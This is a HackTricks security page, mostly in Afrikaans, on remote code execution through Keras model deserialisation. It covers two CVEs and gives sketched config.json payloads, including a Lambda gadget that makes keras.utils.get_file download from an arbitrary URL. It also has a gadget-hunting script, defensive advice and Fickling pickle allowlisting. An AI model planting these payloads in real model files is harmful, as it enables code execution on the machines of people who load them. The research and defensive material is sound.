# Keras Model Deserialisering RCE en Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy som praktiese exploiteringstegnieke teen die Keras model deserialisering-pipeline op, verduidelik die native .keras-formaat se interne struktuur en attack surface, en verskaf 'n navorsings-toolkit om Model File Vulnerabilities (MFVs) en post-fix gadgets te vind.

## .keras model formaat interne struktuur

'n .keras-lêer is 'n ZIP-argief wat minstens die volgende bevat:
- metadata.json – generiese inligting (bv., Keras-weergawe)
- config.json – model-argitektuur (primêre attack surface)
- model.weights.h5 – gewigte in HDF5

Die config.json bestuur recursive deserialisering: Keras importeer modules, los klasse/funksies op en rekonstrueer lae/objekte vanaf attacker-controlled dictionaries.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- Module-import en simboolresolusie van module/class_name-sleutels
- from_config(...) of constructor-aanroep met attacker-controlled kwargs
- Rekursie in geneste objekte (activations, initializers, constraints, etc.)

In die verlede het dit drie primitiewe aan 'n attacker wat config.json opstel, blootgestel:
- Beheer oor watter modules geïmporteer word
- Beheer oor watter classes/funksies opgelos word
- Beheer van kwargs wat aan constructors/from_config deurgegee word

## CVE-2024-3660 – Lambda-layer bytecode RCE

Wortelsaak:
- Lambda.from_config() het python_utils.func_load(...) gebruik wat base64-dekodeer en marshal.loads() op attacker-bytes aanroep; Python se unmarshalling kan kode uitvoer.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigasie:
- Keras dwing safe_mode=True af as standaard. Geserialiseerde Python-funksies in Lambda word geblokkeer, tensy ’n gebruiker uitdruklik uitskakel met safe_mode=False.

Aantekeninge:
- Legacy-formate (ouer HDF5-saves) of ouer codebases mag dalk nie moderne kontroles afdwing nie, dus kan “downgrade”-styl-aanvalle steeds van toepassing wees wanneer slagoffers ouer loaders gebruik.

## CVE-2025-1550 – Arbitrêre module-import in Keras ≤ 3.8

Worteloorsaak:
- _retrieve_class_or_fn het onbeperkte importlib.import_module() gebruik met deur-aanvaller-beheerde module-stringe uit config.json.
- Impak: Arbitrêre import van enige geïnstalleerde module (of deur-aanvaller-geplante module op sys.path). Kode wat tydens import loop word uitgevoer, daarna vind objekkonstruksie plaas met aanvaller-kwargs.

Eksploit-idee:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sekuriteitsverbeterings (Keras ≥ 3.9):
- Module allowlist: invoere beperk tot amptelike ekosisteem-modules: keras, keras_hub, keras_cv, keras_nlp
- Standaard safe mode: safe_mode=True blokkeer die laai van onveilige geserialiseerde Lambda-funksies
- Basiese tipekontrole: gedeserialiseerde objekte moet by die verwagte tipes pas

## Post-fix gadget-oppervlak binne allowlist

Selfs met allowlisting en safe mode bly daar 'n wye oppervlak oor tussen die toegelate Keras callables. Byvoorbeeld, keras.utils.get_file kan arbitrêre URLs na gebruikers-gekose plekke aflaai.

Gadget via Lambda wat na 'n toegelate funksie verwys (nie geserialiseerde Python bytecode nie):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Belangrike beperking:
- Lambda.call() voeg die invoer-tensor vooraan as die eerste posisionele argument wanneer die teiken callable aangeroep word. Geselekteerde gadgets moet 'n ekstra posisionele arg kan verdra (of *args/**kwargs aanvaar). Dit beperk watter funksies bruikbaar is.

Potensiële impakte van allowlisted gadgets:
- Arbitrêre download/write (path planting, config poisoning)
- Netwerk callbacks/SSRF-agtige effekte afhangende van die omgewing
- Ketting na code execution indien geskryfde paaie later geïmporteer/uitgevoer word of bygevoeg word tot PYTHONPATH, of as 'n skryfbare execution-on-write ligging bestaan

## Researcher toolkit

1) Sistematiese gadget-ontdekking in toegelate modules

Lys kandidaat-callables in keras, keras_nlp, keras_cv, keras_hub en prioritiseer dié met lêer/netwerk/proses/env newe-effekte.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Direkte deserialiseringstoetsing (geen .keras-argief nodig nie)

Voer vervaardigde dicts direk in Keras deserializers in om aanvaarde params te leer en newe-effekte waar te neem.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Kruisweergawe-toetsing en formate

Keras bestaan in meerdere codebases/eras met verskillende beskermingsmeganismes en formate:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, beplande verwydering)
- tf-keras: afsonderlik onderhou
- Multi-backend Keras 3 (official): het die inheemse .keras bekendgestel

Herhaal toetse oor codebases en formate (.keras vs legacy HDF5) om regressies of ontbrekende beskerming te ontdek.

## Defensive recommendations

- Behandel modellêers as onbetroubare invoer. Laai slegs modelle vanaf betroubare bronne.
- Hou Keras op datum; gebruik Keras ≥ 3.9 om voordeel te trek uit allowlisting en tipekontroles.
- Stel nie safe_mode=False in wanneer modelle gelaai word tensy jy die lêer ten volle vertrou nie.
- Oorweeg om deserialisasie in 'n sandboxed, minste-bevoegdheidsomgewing te laat loop sonder netwerk-uitgaande verkeer en met beperkte lêerstelseltoegang.
- Handhaaf allowlists/signatures vir modelbronne en integriteitskontrole waar moontlik.

## ML pickle import allowlisting for AI/ML models (Fickling)

Baie AI/ML-modelformate (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, ouer TensorFlow-artikels, ens.) sluit Python pickle-data in. Aanvallers misbruik gereeld pickle GLOBAL imports en objekkonstruktore om RCE of modelwissel tydens laai te bewerkstellig. Swartlys-gebaseerde skandeerders mis dikwels nuwe of nie-gelysde gevaarlike imports.

'n Praktiese fail-closed verdedigingsmetode is om Python se pickle-deserialiseerder te hook en slegs 'n hersiene stel onskadelike, ML-verwante imports tydens unpickling toe te laat. Trail of Bits’ Fickling implementeer hierdie beleid en lewer 'n gekeurde ML-import allowlist gebou uit duisende publieke Hugging Face-pickles.

Sekuriteitsmodel vir “safe” imports (intuïsies gedistilleer uit navorsing en praktyk): ingevoerde simbole wat deur 'n pickle gebruik word, moet terselfdertyd:
- Nie kode uitvoer of uitvoering veroorsaak nie (geen compiled/source code objects, shelling out, hooks, ens.)
- Nie arbitrêre attribuut- of item kry/stel nie
- Nie ander Python-objekte vanaf die pickle VM invoer of verwysings daartoe bekom nie
- Geen sekondêre deserialiseerders aktiveer nie (bv. marshal, nested pickle), selfs nie indirek nie

Skakel Fickling se beskerming so vroeg as moontlik in tydens proses-opstart in sodat enige pickle-laaie wat deur frameworks (torch.load, joblib.load, ens.) uitgevoer word, gekontroleer word:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operasionele wenke:
- Jy kan die hooks tydelik deaktiveer/heraktiveer waar nodig:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- As 'n model wat as veilig bekend staan geblokkeer word, brei die allowlist vir jou omgewing uit nadat jy die simbole nagegaan het:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling ontbloot ook generiese runtime-beskermers as jy meer fyn beheer verkies:
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Gee voorkeur aan nie-pickle model formate waar moontlik (bv., SafeTensors). As jy pickle moet aanvaar, laat loaders loop onder minste voorregte sonder netwerk-uitset en dwing die allowlist af.

Hierdie allowlist-eerstestrategie blokkeer aantoonbaar algemene ML pickle-uitbuitingpaaie terwyl dit hoë versoenbaarheid behou. In ToB’s benchmark het Fickling 100% van sintetiese kwaadwillige lêers gemerk en ~99% van skoon lêers van top Hugging Face repos toegelaat.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
